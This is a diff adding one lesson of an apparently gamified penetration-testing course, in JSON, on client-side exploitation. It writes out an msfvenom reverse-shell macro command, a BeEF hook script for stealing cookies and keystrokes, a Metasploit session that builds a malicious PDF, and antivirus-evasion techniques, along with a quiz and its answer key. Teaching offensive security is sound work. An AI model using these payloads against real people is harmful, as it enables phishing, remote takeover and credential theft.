@@ -1,0 +1,77 @@
+{
+    "id": "l7",
+    "chapterId": "ch_7",
+    "title": "Client-Side Exploitation 🖥️",
+    "description": "Trick users into running malicious code.",
+    "xpReward": 30,
+    "estimatedMinutes": 9,
+    "section": "Attacks",
+    "slides": [
+        {
+            "id": "s_l7_1",
+            "type": "text",
+            "title": "Attacking the User, Not the Server 👤",
+            "content": "# Bypassing the Firewall\n\nFirewalls block inbound connections to servers. But they **allow outbound connections** from users' workstations.\n\n**Client-Side Exploitation** involves tricking a user into:\n- Opening a malicious **document** (Word, PDF).\n- Visiting a malicious **website**.\n- Plugging in a malicious **USB drive**.\n\n**Result**: The user's computer connects **outbound** to you, bypassing the firewall entirely."
+        },
+        {
+            "id": "s_l7_2",
+            "type": "text",
+            "title": "Malicious Office Macros 📎",
+            "content": "# The Classic Phishing Attachment\n\nMicrosoft Office allows **VBA Macros**—scripts that automate tasks. They can also download and execute malware.\n\n**Weaponizing a Word Document with Metasploit:**\n1.  Generate a Macro payload:\n    ```bash\n    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f vba\n    ```\n2.  Copy the generated VBA code.\n3.  Create a Word document, insert a Macro, paste the code.\n4.  Save as `.docm` (Macro-Enabled Document).\n5.  Set up a listener in Metasploit (`exploit/multi/handler`).\n6.  Send the document to the target.\n\n**Evasion Tip**: Modern Office blocks macros by default. You need **Social Engineering** to convince the user to click 'Enable Content'."
+        },
+        {
+            "id": "s_l7_3",
+            "type": "quiz",
+            "title": "Client-Side Concept 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l7_1",
+                "type": "multiple_choice",
+                "question": "Why are client-side attacks effective against firewalled targets?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "They use encrypted traffic.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "They exploit the web server directly.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The victim's machine initiates the outbound connection, bypassing inbound firewall rules.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "They use UDP instead of TCP.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Outbound connections are typically allowed, so the payload calls home to the attacker.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l7_4",
+            "type": "text",
+            "title": "Browser Exploitation (BeEF) 🐄",
+            "content": "# Hooking the Browser\n\n**BeEF (Browser Exploitation Framework)** is a tool that focuses on exploiting the web browser itself.\n\n**How it Works:**\n1.  You inject a **JavaScript hook** into a website the victim visits (via XSS or phishing).\n2.  The hooked browser reports back to your BeEF server.\n3.  You can now launch modules to:\n    - Fingerprint the browser/OS.\n    - Steal cookies (Session Hijacking).\n    - Keylogging.\n    - Social Engineering popups (Fake Flash Update).\n\n**Starting BeEF:**\n```bash\nsudo beef-xss\n# Then browse to http://127.0.0.1:3000/ui/panel\n```\n\n**The Hook Script:** `<script src=\"http://[Your_IP]:3000/hook.js\"></script>`"
+        },
+        {
+            "id": "s_l7_5",
+            "type": "code",
+            "title": "Generating a Malicious PDF 📄",
+            "content": "Using Metasploit to embed a payload into a PDF.",
+            "codeSnippet": "msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe\nmsf6 exploit(adobe_pdf_embedded_exe) > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf6 exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.56.102\nmsf6 exploit(adobe_pdf_embedded_exe) > set FILENAME report.pdf\nmsf6 exploit(adobe_pdf_embedded_exe) > exploit\n\n[*] Creating report.pdf...\n[+] report.pdf stored at /root/.msf4/local/report.pdf\n```\n\nThis creates a PDF that, when opened with a vulnerable Adobe Reader, executes the payload."
+        },
+        {
+            "id": "s_l7_6",
+            "type": "warning",
+            "title": "Antivirus Detection 🛡️",
+            "content": "## Standard Payloads Will Be Caught\n\nIf you generate a payload with `msfvenom` using default settings, Windows Defender **will detect and quarantine it** immediately.\n\n**Bypass Techniques (Covered in later chapters):**\n- **Encoders** (`-e x86/shikata_ga_nai`).\n- **Custom Templates**.\n- **Veil-Evasion** framework.\n- **Obfuscation**."
+        }
+    ]
+}
